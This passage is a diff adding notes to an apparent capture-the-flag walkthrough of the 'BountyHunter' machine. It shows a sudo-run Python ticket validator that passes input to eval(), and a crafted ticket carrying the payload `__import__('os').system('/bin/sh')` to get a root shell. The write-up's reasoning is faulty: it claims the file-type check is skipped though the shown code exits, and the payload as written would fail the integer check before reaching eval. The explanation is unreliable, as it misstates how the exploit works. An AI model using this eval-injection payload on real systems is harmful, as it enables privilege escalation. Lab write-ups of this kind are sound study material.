@@ -73,4 +73,86 @@ data=@urlencode><@base64><?xml version-"1.0" encoding="ISO-8859-1"?>
 
 copy the td and go to terminal
 echo "the td data type shit" | base64 -d
+connect to the machine with SSH
 
+----
+**finding privesc path**
+
+the user ``development`` has user privilege
+run ``sudo -l`` to check it
+now you can see a script that requrires ``NOPASSWD`` to run
+
+![[Pasted image 20250506105932.png]]
+
+TicketValidator.py python script:
+```
+#!/usr/bin/env python3
+
+def load_file(loc):
+    if loc.endswith(".md"):
+        return open(loc, 'r')
+    else:
+        print("Wrong file type.")
+        exit()
+
+def evaluate(ticketFile):
+    #Evaluates a ticket to check for irregularities.
+    code_line = None
+    for i, x in enumerate(ticketFile.readlines()):
+        if not x.startswith("# Skytrain Inc"):
+            return False
+        if i == 1:
+            if not x.startswith("## Ticket to "):
+                return False
+            print(f"Destination: {''.join(x.strip().split(' ')[2:])}")
+            continue
+        if x.startswith("# Ticket Code: "):
+            code_line = i+1
+            continue
+        if code_line and i == code_line:
+            if not x.startswith("**"):
+                return False
+            ticketCode = x.replace("**", "").split("*")[0]
+            if int(ticketCode) % 7 == 4:
+                validationNumber = eval(x.replace("**", ""))
+                if validationNumber > 100:
+                    return True
+                else:
+                    return False
+            return False
+    return False
+
+def main():
+    fileName = input("Please enter the path to the ticket file.\n")
+    ticket = load_file(fileName)
+    #DEBUG print(ticket)
+    result = evaluate(ticket)
+    if (result):
+        print("Valid ticket.")
+    else:
+        print("Invalid ticket.")
+    ticket.close
+
+main()
+```
+
+**flaws in the script**
+the script asks for a `.md` for tickets, but it still continues even if it's not `.md`
+so we can craft even a `.txt` file to act like a ticket and feed it to the script
+
+here's what i came up with
+```
+# Skytrain Inc
+## Ticket to Anywhere
+# Ticket Code:
+**__import__('os').system('/bin/sh')**
+```
+
+what it does is, it gives the script the minimum requirements it asks for tickets to be valid 
+Line 1: `# Skytrain Inc` satisfies the first-line check.
+Line 2:` ## Ticket` to Anywhere meets the second-line requirement (the destination can be anything).
+Line 3: `# Ticket Code`: indicates the next line is the ticket code.
+Line 4: ``**__import__('os').system('/bin/sh')**`` is the payload.
+
+after that, it executes the `bin/sh` to spawn a root shell to the target machine
+VOILA! BountyHunter PWNED!
